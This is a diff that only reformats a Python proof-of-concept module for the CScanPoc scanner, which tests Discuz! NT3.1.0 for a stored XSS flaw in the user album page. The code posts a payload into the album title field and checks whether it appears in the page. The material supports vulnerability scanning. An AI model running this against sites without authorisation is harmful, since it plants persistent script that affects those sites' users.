@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Discuz_0005' # 平台漏洞编号，留空
+    vuln_id = 'Discuz_0005'  # 平台漏洞编号，留空
     name = 'Discuz! NT3.1.0 用户相册存储型XSS'  # 漏洞名称
     level = VulnLevel.MED  # 漏洞危害级别
-    type = VulnType.XSS # 漏洞类型
+    type = VulnType.XSS  # 漏洞类型
     disclosure_date = '2015-04-25'  # 漏洞公布时间
     desc = '''
         Discuz! NT3.1.0 用户相册存储型XSS漏洞。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     product = 'Discuz!'  # 漏洞应用名称
     product_version = 'Discuz! NT3.1.0'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '30703d92-b695-428c-987c-4db0d1eca92a'
     author = 'cscan'  # POC编写者
@@ -26,10 +28,11 @@ class Poc(ABPoc):
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
-            
+
     def verify(self):
         try:
-            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(target=self.target, vuln=self.vuln))
+            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))
 
             session = requests.Session()
             path = '/usercpspacemanagealbum.aspx?page=1&mod=edit&albumid=32'
@@ -46,26 +49,29 @@ class Poc(ABPoc):
             Auth = requests.auth.HTTPBasicAuth(username, password)
 
             PostData = {
-                    'albumtitle':payload,
-                    'albumid':'302',
-                    'active':'',
-                    'albumcate':'2',
-                    'albumdescription':'',
-                    'type':0,
-                    'password':'',
-                    'Submit':'确定'}
-            Header = {'User-Agent':UA, 'Referer':Referer_url,'X-Requested-With':'XMLHttpRequest' }
+                'albumtitle': payload,
+                'albumid': '302',
+                'active': '',
+                'albumcate': '2',
+                'albumdescription': '',
+                'type': 0,
+                'password': '',
+                'Submit': '确定'}
+            Header = {'User-Agent': UA, 'Referer': Referer_url,
+                      'X-Requested-With': 'XMLHttpRequest'}
 
             # Login and get session
             session.get(Url, data=PostData, auth=Auth, headers=Header)
             # post editor to dz
             session.post(Url, data=PostData, headers=Header)
             # get result
-            r = session.get('{}/usercpspacemanagealbum.aspx'.format(Host), headers=Header)
+            r = session.get(
+                '{}/usercpspacemanagealbum.aspx'.format(Host), headers=Header)
             if payload in r.text:
                 #args['success'] = True
                 #args['poc_ret']['vul_url'] = Url
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
             return None
 
         except Exception, e:
@@ -73,6 +79,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
